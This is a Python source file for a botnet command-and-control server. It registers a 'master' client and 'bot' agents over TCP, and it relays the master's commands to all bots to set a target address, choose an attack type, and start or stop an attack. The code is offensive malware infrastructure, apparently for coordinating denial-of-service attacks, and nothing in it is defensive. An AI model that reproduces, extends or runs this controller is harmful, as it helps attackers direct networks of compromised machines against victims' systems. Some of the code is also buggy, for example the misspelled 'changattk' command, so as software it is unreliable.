from array import array
import socket
import sys
from typing import Any
import select

socket_list: list[socket.socket] = []
RECV_BUFFER = 4096
ENCODING = 'utf-8'

bot_agents: dict[socket.socket, Any] = {}
master_client: socket.socket = None
target_address: str = ''
attk_type: int = 0
attacking: bool = False


def accept_wrapper(sock: socket.socket) -> None:
    socket_list.append(sock)
    print(f'New client connected > {str(sock.getsockname())}')
    sock.send('whoami:_'.encode(ENCODING))  # Ask client for identification


def request_router(sock: socket.socket) -> None:
    sock_addr = sock.getsockname()
    recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
    print(f'received request from ${recv_data}')
    try:
        if recv_data:
            try:
                req_type, req_body = recv_data.split(':')
                if req_type == 'iam':   # iam request applies to both master and bot agent
                    iam_handler(sock, req_body)
                elif sock in bot_agents:
                    bot_handler(sock, req_type, req_body)
                elif sock == master_client:
                    master_handler(sock, req_type, req_body)
                else:
                    print(
                        f'Cannot handle request from {sock_addr}\nrequest:{recv_data}'
                    )
                    response = f'{req_type}:error:cannot handle request'.encode(
                        ENCODING)
                    sock.send(response)
            except ValueError:
                print(f'cannot parse request!')
                response = '_:error:cannot parse request'.encode(ENCODING)
                sock.send(response)
        # No data received means that client closed gracefully
        else:
            disconnect_wrapper(sock)
    # Abrupt client disconnect
    except:
        disconnect_wrapper(sock)


def iam_handler(sock: socket.socket, body: str) -> None:
    if body == 'master':
        global master_client
        master_client = sock
        response = 'iam:success:master identified'
    elif body == 'bot':
        bot_agents[sock] = sock.getsockname()
        response = 'iam:success:bot identified'
    else:
        response = 'iam:error:unknown type'

    sock.send(response.encode(ENCODING))


def master_handler(sock: socket.socket, type: str, body: str) -> None:
    global attacking
    global attk_type
    global target_address
    if type == 'listbot':
        if len(bot_agents) == 0:
            response = 'listbot: '
        else:
            list_bot = ''
            for bot in bot_agents:
                list_bot += repr(bot_agents[bot]) + ','
            response = ('listbot:' + list_bot)
    elif type == 'changeip':
        # TODO: check if valid ip/address
        bot_broadcast(f'changeip:{body}'.encode(ENCODING))
        target_address = body
        return
    elif type == 'changattk':
        # TODO: check if valid attack
        bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
        attk_type = body
        return
    elif type == 'startattk':
        if not target_address:
            response = 'startattk:error:no target set'
        elif not attk_type:
            response = 'startattk:error:no attack type set'
        elif attacking:
            response = 'startattk:error:already attacking'
        else:
            bot_broadcast('startattk:True'.encode(ENCODING))
            attacking = True
            response = 'startattk:success:started attack'
    elif type == 'stopattk':
        if not target_address or not attacking or not attk_type:
            response = 'stopattk:error:no attack in progress'
        else:
            bot_broadcast('stopattk:True'.encode(ENCODING))
            attacking = False
            response = 'stopattk:success:stopped attack'
    else:
        response = f'{type}:error:unknown command'

    sock.send(response.encode(ENCODING))


def bot_handler(sock: socket.socket, type: str, body: str) -> None:
    pass


def bot_broadcast(message: bytes) -> None:
    for sock in bot_agents:
        sock.send(message)


def disconnect_wrapper(sock: socket.socket) -> None:
    global master_client
    socket_list.remove(sock)
    sock_addr = repr(sock.getsockname())

    # bot agent disconnect
    if sock in bot_agents:
        del bot_agents[sock]

        if master_client:
            master_client.send(f'botleft:{sock_addr}'.encode(ENCODING))

        print(f'bot agent {sock_addr} disconnected')
    # master client disconnect
    elif master_client == sock:
        master_client = None
        print(f'master client {sock_addr} disconnected')
    else:
        print(f'client {sock_addr} disconnected')


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("usage:", sys.argv[0], "<host> <port>")
        sys.exit(1)

    host, port = sys.argv[1], int(sys.argv[2])
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen()
    socket_list.append(server_socket)
    print(f"listening for connections on {host}:{port}")

    try:
        while True:
            read_sockets, _, exception_sockets = select.select(
                socket_list, [], socket_list
            )

            for notified_socket in read_sockets:
                # New connection
                if notified_socket == server_socket:
                    conn, addr = server_socket.accept()
                    accept_wrapper(conn)
                # New request
                else:
                    request_router(notified_socket)

            for notified_socket in exception_sockets:
                disconnect_wrapper(notified_socket)

    except KeyboardInterrupt:
        print("caught keyboard interrupt, exiting")
    except Exception as e:
        print(e)
    finally:
        server_socket.close()
        sys.exit()
